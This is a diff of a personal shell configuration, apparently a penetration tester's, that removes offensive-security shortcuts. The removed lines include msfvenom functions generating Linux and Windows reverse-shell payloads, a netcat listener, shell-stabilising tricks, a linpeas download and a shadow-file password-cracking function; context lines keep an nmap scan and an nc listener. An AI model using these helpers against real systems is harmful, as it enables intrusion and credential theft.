@@ -77,21 +77,6 @@ alias nano="nvim"
 alias vs="codium"
 alias vsc="codium"
 
-# playwright (testing framework)
-alias pwt='bunx playwright test'
-alias pwc='bunx playwright codegen'
-alias pwr='bunx playwright show-report'
-
-# Golang
-alias gr='go run .'
-alias gb='go build .'
-alias gmi='go mod init'
-alias gmt='go mod tidy'
-
-# tty upgrades
-alias uptty="echo '/usr/bin/script -qc /bin/bash /dev/null'| $CLIPBOARD"
-alias fixtty="stty raw -echo; fg; reset | $CLIPBOARD"
-
 # Nix
 alias x='nix run .'
 alias nd='nix develop'
@@ -133,35 +118,6 @@ nmap-udp() {
     else
       [ ! -d "./nmap" ] && echo "[i] Creating $(pwd)/nmap..." && mkdir nmap
       sudo nmap -sUCV -T4 --min-rate 10000 "${@}" -v -oA nmap/udp_default
-  fi
-}
-
-# msfvenom
-venom-elf() {
-  if [ $# -eq 0 ]
-    then
-      echo "[i] Usage: msfvenom ip (options)"
-    else
-      msfvenom -p linux/x64/shell_reverse_tcp LHOST="${@}" LPORT=4444 -f elf -o reverse.elf
-  fi
-}
-
-venom-exe() {
-  if [ $# -eq 0 ]
-    then
-      echo "[i] Usage: msfvenom ip (options)"
-    else
-      msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST="${@}" LPORT=4444 -f exe -o reverse.exe
-  fi
-}
-
-# discovery
-subdomainscan() {
-  if [ $# -eq 0 ]
-    then
-      echo "[i] Usage: Enter a valid domain (options)"
-    else
-      wfuzz -c -f sub-domains.txt -Z -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --sc 200,202,204,301,302,307,403 -u http://"${@}" -H "Host: FUZZ.${@}"
   fi
 }
 
@@ -220,24 +176,10 @@ alias csl="clear"
 alias t="tmux"
 alias df="duf"
 alias rr="ranger"
-alias up="lsof -i | grep LISTEN"
 alias gdb="gdb --quiet"
-alias rsc="rlwrap nc -lnvp 4444"
 alias cds="du -h --max-depth=1 ."
 alias www="sudo python3 -m http.server 80"
 alias tcp-server="cd /tmp/ && while :; do nc -l -p 4444 | tee  output.log; sleep 1; done"
-alias linpeas="curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -s --output lin.sh"
-
-yescrypt-crack() {
-    if [ -f "./passwd" ] && [ -f "./shadow" ]; then
-        sudo unshadow passwd shadow > unshadow.txt
-        echo "UNSHADOW COMPLETED!"
-        sudo john --format=crypt unshadow.txt -w=/usr/share/wordlists/rockyou.txt
-    else
-        echo "At least one of the files does not exist."
-    fi
-}
-
 
 #
 # Paths & variables
